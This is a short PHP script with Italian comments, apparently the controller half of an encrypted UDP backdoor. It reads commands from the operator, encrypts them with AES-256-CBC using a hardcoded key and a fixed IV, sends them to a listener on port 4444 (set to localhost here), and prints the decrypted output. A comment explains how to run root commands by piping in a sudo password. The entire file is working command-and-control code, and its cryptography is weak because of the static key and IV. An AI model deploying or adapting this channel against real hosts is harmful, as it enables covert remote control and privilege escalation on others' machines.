<?php
$target = "127.0.0.1";
$port = 4444;
$key = 'AES256key';
$method = 'AES-256-CBC';
$vettore = '1234567890123456';

if (($sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP)) === false) {
    exit("Errore creazione socket\n");
}

while (true) {
    // prendo in input il comando da inviare alla shell
    echo "Comando: ";
    $cmd = trim(fgets(STDIN));
    /*
    /   per eseguire un comando che richide sudo fare:
    /   sudo <password> | sudo -S <comando>
    /   -S, --stdin      read password from standard input
    /
    /   alcuni comandi non funzionano perche php non ha accesso ad alcuni file
    /   ad esempio non funziona:ifconfig, ip addr, ls /etc
    */

    // cifro e mando il comando
    $encrypted_cmd = openssl_encrypt($cmd, $method, $key, 0, $vettore);
    socket_sendto($sock, $encrypted_cmd, strlen($encrypted_cmd), 0, $target, $port);

    // ricevo e decripto la risposta
    $buf = "";
    socket_recvfrom($sock, $buf, 1024, 0, $target, $port);
    $response = openssl_decrypt($buf, $method, $key, 0, $vettore);
    echo "Risposta: $response\n";
}

socket_close($sock);
?>
